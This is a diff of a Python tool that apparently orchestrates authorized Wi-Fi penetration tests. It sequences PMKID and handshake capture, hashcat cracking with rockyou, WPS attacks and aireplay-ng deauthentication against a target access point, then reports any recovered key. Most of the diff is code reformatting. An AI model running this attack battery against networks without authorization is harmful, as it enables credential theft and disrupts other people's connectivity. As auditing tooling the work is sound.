@@ -854,11 +1136,21 @@ def _phase_psk_rockyou(target: TargetInfo, run_dir: str) -> tuple[str, Optional[
         return "skipped", None, None
 
     result = _run_tool(
-        ["hashcat", "-m", "22000", hash_path, rockyou, "--quiet", "--status", "--status-timer=30"],
+        [
+            "hashcat",
+            "-m",
+            "22000",
+            hash_path,
+            rockyou,
+            "--quiet",
+            "--status",
+            "--status-timer=30",
+        ],
         timeout=TIMEOUTS["PSK_ROCKYOU"],
         desc=f"Diccionario rockyou · {target.ssid}",
     )
-    if result["timed_out"]: return "timeout", None, None
+    if result["timed_out"]:
+        return "timeout", None, None
     if result["returncode"] == 0:
         key = _extract_hashcat_key(hash_path) or "Recuperada en rockyou.txt"
         return "cracked", key, "WPA2-PSK (Diccionario)"
@@ -868,11 +1160,15 @@ def _phase_psk_rockyou(target: TargetInfo, run_dir: str) -> tuple[str, Optional[
 def _phase_audit_dpp(target: TargetInfo, profile: Profile, run_dir: str) -> str:
     """Evalúa onboarding DPP por señales observables (transición, WPS, flota)."""
     from .vendor_profiles import dpp_assessment
-    a = dpp_assessment(profile.brand, target.ssid,
-                       wpa3_supported=target.wpa3_supported,
-                       dpp_supported=target.dpp_supported,
-                       wps_enabled=target.wps_enabled,
-                       encryption=target.encryption)
+
+    a = dpp_assessment(
+        profile.brand,
+        target.ssid,
+        wpa3_supported=target.wpa3_supported,
+        dpp_supported=target.dpp_supported,
+        wps_enabled=target.wps_enabled,
+        encryption=target.encryption,
+    )
     try:
         with open(f"{run_dir}/dpp_assessment.json", "w") as f:
             json.dump(a, f, indent=2)
@@ -881,12 +1177,15 @@ def _phase_audit_dpp(target: TargetInfo, profile: Profile, run_dir: str) -> str:
     for s in a["signals"]:
         mark = {"ok": "green", "warn": "yellow", "risk": "red"}[s["status"]]
         console.print(f"  [{mark}]DPP/{s['signal']}:[/{mark}] {s['status']}")
-    return {"clear": "done", "needs_evidence": "not_found", "concern": "not_found"}[a["verdict"]]
+    return {"clear": "done", "needs_evidence": "not_found", "concern": "not_found"}[
+        a["verdict"]
+    ]
 
 
 def _phase_eol_governance(target: TargetInfo, profile: Profile, run_dir: str) -> str:
     """Evalúa brecha de firmware contra la base EOL local (por flota, sin internet)."""
     from .vendor_profiles import eol_assessment
+
     a = eol_assessment(profile.brand, target.ssid)
     try:
         with open(f"{run_dir}/eol_assessment.json", "w") as f:
@@ -897,7 +1196,9 @@ def _phase_eol_governance(target: TargetInfo, profile: Profile, run_dir: str) ->
         console.print(f"  [red]Hallazgo EOL ({a['brand']}):[/red] {a['reasons'][0]}")
         console.print(f"  [dim]Acción: {a['action']}[/dim]")
         return "eol_confirmed"
-    console.print(f"  [dim]EOL {a['brand']}: se requiere evidencia ({a['required_evidence'][0]})[/dim]")
+    console.print(
+        f"  [dim]EOL {a['brand']}: se requiere evidencia ({a['required_evidence'][0]})[/dim]"
+    )
     return "not_found"
 
 
@@ -908,7 +1209,9 @@ def _phase_resilience_test(target: TargetInfo, iface: str, run_dir: str) -> str:
     opaco, así que se guarda stderr en evidence y se diagnostica.
     """
     if not _tool_available("aireplay-ng"):
-        console.print("  [yellow]aireplay-ng no disponible — resiliencia degradada[/yellow]")
+        console.print(
+            "  [yellow]aireplay-ng no disponible — resiliencia degradada[/yellow]"
+        )
         return "skipped"
     result = _run_tool(
         ["aireplay-ng", "--deauth", "5", "-a", target.bssid, iface],
@@ -920,19 +1223,29 @@ def _phase_resilience_test(target: TargetInfo, iface: str, run_dir: str) -> str:
     _save_stderr(run_dir, "resilience", result)
     err_low = ((result.get("stderr") or "") + (result.get("stdout") or "")).lower()
     if "no such device" in err_low or "no such file" in err_low:
-        console.print(f"  [yellow]aireplay sin interfaz ({iface}) — ¿modo monitor inactivo?[/yellow]")
-    elif "monitor" in err_low or "operation not supported" in err_low or "not supported" in err_low:
-        console.print(f"  [yellow]aireplay exige monitor en {iface} — inyección no disponible[/yellow]")
+        console.print(
+            f"  [yellow]aireplay sin interfaz ({iface}) — ¿modo monitor inactivo?[/yellow]"
+        )
+    elif (
+        "monitor" in err_low
+        or "operation not supported" in err_low
+        or "not supported" in err_low
+    ):
+        console.print(
+            f"  [yellow]aireplay exige monitor en {iface} — inyección no disponible[/yellow]"
+        )
     return "error"
 
 
-def _phase_audit_lan_surface(target: TargetInfo, run_dir: str,
-                             scope: Optional[Dict], allow_lan: bool) -> str:
+def _phase_audit_lan_surface(
+    target: TargetInfo, run_dir: str, scope: Optional[Dict], allow_lan: bool
+) -> str:
     """Superficie LAN del gateway (solo lectura). Requiere --allow-lan + gateway en scope."""
     gw = (scope or {}).get("lab_lan_gateway", "") or ""
     if not allow_lan or not gw:
         return "skipped"
     from .lan_audit import audit_lan_surface
+
     try:
         data = audit_lan_surface(gw)
     except ValueError as e:
@@ -949,13 +1262,16 @@ def _phase_audit_lan_surface(target: TargetInfo, run_dir: str,
     console.print(f"  [dim]LAN {gw}: {data['summary']}[/dim]")
     for c in data["checks"]:
         if c["open"] and c.get("finding"):
-            console.print(f"  [yellow]◉ {c['port']}/{c['service']}[/yellow] → {c['finding']}")
+            console.print(
+                f"  [yellow]◉ {c['port']}/{c['service']}[/yellow] → {c['finding']}"
+            )
     return "done"
 
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Orquestador principal
 # ──────────────────────────────────────────────────────────────────────────────
+
 
 def run_single_target(
     target: TargetInfo,
@@ -975,6 +1291,7 @@ def run_single_target(
 
     run_id = str(uuid.uuid4())[:8]
     from .roe import evidence_dir
+
     run_dir = evidence_dir(run_id)
     os.makedirs(run_dir, exist_ok=True)
     t_start = time.time()
@@ -991,12 +1308,22 @@ def run_single_target(
 
     # Decidir path
     path = decide_path(
-        target, profile,
+        target,
+        profile,
         wids_enabled=wids_active,
         dry_run=False,
     )
     # Remover marcador interno
     path = [p for p in path if p != "START_WIDS_MONITORING"]
+
+    # Veredicto por-target: cada run empieza con la cadena de evaluación limpia
+    global _broadcom_patched, _broadcom_eval
+    _broadcom_patched = False
+    _broadcom_eval = None
+
+    if "BROADCOM_EVAL" in path:
+        resto = " → ".join(p for p in path if p not in ("BROADCOM_EVAL", "REPORT"))
+        console.print(f"  [dim][EVAL] ruta secuencial: BROADCOM_EVAL → {resto}[/dim]")
 
     phase_results: Dict[str, str] = {}
     final_result = "pending"
@@ -1010,7 +1337,18 @@ def run_single_target(
         # Batería autónoma: crackeado => se omiten los vectores restantes
         if final_result == "cracked" and phase in ATTACK_PHASES:
             phase_results[phase] = "skipped"
-            print_phase_result(phase, "skipped", detail="batería detenida: credencial ya obtenida")
+            print_phase_result(
+                phase, "skipped", detail="batería detenida: credencial ya obtenida"
+            )
+            continue
+
+        # Veredicto BROADCOM_EVAL: hostapd parcheado => solo WPS se omite
+        # (captura + PSK corren igual: la PSK sigue siendo atacable).
+        if _broadcom_patched and phase in WPS_ONLY_PHASES:
+            phase_results[phase] = "skipped"
+            print_phase_result(
+                phase, "skipped", detail="hostapd parcheado — WPS omitido"
+            )
             continue
 
         print_phase_start(phase, target.bssid, target.ssid)
@@ -1027,10 +1365,15 @@ def run_single_target(
             elif phase == "CAPTURE_HANDSHAKE":
                 r = _phase_capture_handshake(target, iface, run_dir)
 
+            elif phase == "BROADCOM_EVAL":
+                r, key_val, type_val = _phase_broadcom_eval(target, iface)
+
             elif phase == "WPS_CLASS":
                 r, key_val, type_val = _phase_wps_class(target, iface, run_dir)
                 if r == "locked":
-                    console.print("  [yellow]AP en lockout — deteniendo path aéreo[/yellow]")
+                    console.print(
+                        "  [yellow]AP en lockout — deteniendo path aéreo[/yellow]"
+                    )
                     final_result = "locked"
                     phase_results[phase] = r
                     break
@@ -1042,7 +1385,9 @@ def run_single_target(
                 r, key_val, type_val = _phase_psk_defaults(target, run_dir)
 
             elif phase == "PSK_SSID_LOGIC":
-                r, key_val, type_val = _phase_psk_ssid_logic(target, run_dir, family_keys=known_keys)
+                r, key_val, type_val = _phase_psk_ssid_logic(
+                    target, run_dir, family_keys=known_keys
+                )
 
             elif phase == "PSK_ROCKYOU":
                 r, key_val, type_val = _phase_psk_rockyou(target, run_dir)
@@ -1059,15 +1404,19 @@ def run_single_target(
             elif phase == "VALIDATE_COUNTERMEASURE":
                 console.print("  [dim]Validación de contramedidas — registrado.[/dim]")
                 r = "done"
-                
+
             elif phase == "DETECT_WPS_LOCKOUT":
-                console.print("  [green]Configuración defensiva detectada: WPS Lockout activo.[/green]")
+                console.print(
+                    "  [green]Configuración defensiva detectada: WPS Lockout activo.[/green]"
+                )
                 r = "locked"
-                
+
             elif phase == "DETECT_WPA3_SAE":
-                console.print("  [green]WPA3 SAE detectado. Omitiendo diccionario offline (resistente por diseño).[/green]")
+                console.print(
+                    "  [green]WPA3 SAE detectado. Omitiendo diccionario offline (resistente por diseño).[/green]"
+                )
                 r = "done"
-                
+
             elif phase == "AUDIT_DPP_VULNERABILITIES":
                 r = _phase_audit_dpp(target, profile, run_dir)
 
@@ -1082,7 +1431,9 @@ def run_single_target(
         if key_val:
             recovered_key = key_val
             key_type = type_val
-            console.print(f"  [bold green]🔑 CREDENCIAL OBTENIDA:[/bold green] [bold white on blue] {recovered_key} [/bold white on blue] [cyan]({key_type})[/cyan]")
+            console.print(
+                f"  [bold green]🔑 CREDENCIAL OBTENIDA:[/bold green] [bold white on blue] {recovered_key} [/bold white on blue] [cyan]({key_type})[/cyan]"
+            )
 
         phase_results[phase] = r
         if phase in ("CAPTURE_PMKID", "CAPTURE_HANDSHAKE") and r == "captured":
@@ -1093,7 +1444,9 @@ def run_single_target(
                     hsize = os.path.getsize(hp)
                 except OSError:
                     hsize = 0
-                console.print(f"  [green]✓ hash guardado:[/green] [dim]{os.path.basename(hp)} ({hsize} B) — listo para crackeo[/dim]")
+                console.print(
+                    f"  [green]✓ hash guardado:[/green] [dim]{os.path.basename(hp)} ({hsize} B) — listo para crackeo[/dim]"
+                )
         print_phase_result(phase, r, detail=f"Clave: {key_val}" if key_val else "")
 
         # Si se crackeó, marcar y continuar hasta REPORT
@@ -1106,11 +1459,19 @@ def run_single_target(
 
     if final_result == "pending":
         # Si ninguna fase marcó resultado, tomar el último no-skipped
-        non_skip = [v for v in phase_results.values() if v not in ("skipped", "done", "captured")]
+        non_skip = [
+            v
+            for v in phase_results.values()
+            if v not in ("skipped", "done", "captured")
+        ]
         final_result = non_skip[-1] if non_skip else "exhausted"
 
-    vectors = [p for p in phase_results if p in ATTACK_PHASES and phase_results[p] != "skipped"]
-    console.print(f"  [dim]Batería: {len(vectors)}/{len(ATTACK_PHASES)} vectores ejecutados → {final_result}[/dim]")
+    vectors = [
+        p for p in phase_results if p in ATTACK_PHASES and phase_results[p] != "skipped"
+    ]
+    console.print(
+        f"  [dim]Batería: {len(vectors)}/{len(ATTACK_PHASES)} vectores ejecutados → {final_result}[/dim]"
+    )
 
     if wids_active:
         sensor.stop()
@@ -1119,17 +1480,30 @@ def run_single_target(
 
     # ── Cadena de custodia + persistencia (nunca rompen la run) ──────────────
     from .roe import write_evidence_manifest, db_path_for
+
     manifest = write_evidence_manifest(run_dir)
     if manifest:
-        console.print(f"  [green]✓ evidencia sellada:[/green] [dim]{len(manifest)} archivos + SHA256SUMS en {run_dir}[/dim]")
+        console.print(
+            f"  [green]✓ evidencia sellada:[/green] [dim]{len(manifest)} archivos + SHA256SUMS en {run_dir}[/dim]"
+        )
     try:
         from .db import init_db, record_run
+
         session = init_db(db_path_for(scope or {}))
-        record_run(session, run_id, target.ssid, target.bssid,
-                   final_result, path, phase_results)
+        record_run(
+            session,
+            run_id,
+            target.ssid,
+            target.bssid,
+            final_result,
+            path,
+            phase_results,
+        )
         session.close()
     except Exception as exc:
-        console.print(f"  [yellow][WARN] BD no persistida ({exc}) — el informe sigue válido[/yellow]")
+        console.print(
+            f"  [yellow][WARN] BD no persistida ({exc}) — el informe sigue válido[/yellow]"
+        )
 
     # Generar reporte
     reporter = Reporter(target.bssid)
@@ -1156,23 +1530,25 @@ def run_single_target(
     except (OSError, ValueError):
         pass
 
-    return {
-        "run_id":        run_id,
-        "evidence_dir":  run_dir,
+    result: Dict[str, Any] = {
+        "run_id": run_id,
+        "evidence_dir": run_dir,
         "evidence_manifest": manifest,
-        "lan_surface":   lan_surface,
+        "lan_surface": lan_surface,
         "eol_assessment": eol_assessment_data,
         "dpp_assessment": dpp_assessment_data,
-        "bssid":         target.bssid,
-        "ssid":          target.ssid,
-        "path":          path,
+        "bssid": target.bssid,
+        "ssid": target.ssid,
+        "path": path,
         "phase_results": phase_results,
-        "result":        final_result,
+        "result": final_result,
         "recovered_key": recovered_key,
-        "key_type":      key_type,
-        "wids_alerts":   len(sensor.get_alerts()),
+        "key_type": key_type,
+        "wids_alerts": len(sensor.get_alerts()),
         "wids_simulated": True,
-        "elapsed_sec":   t_elapsed,
-        "score":         profile.pin_class,
+        "elapsed_sec": t_elapsed,
+        "score": profile.pin_class,
     }
-
+    if _broadcom_eval is not None:
+        result["broadcom_eval"] = _broadcom_eval
+    return result
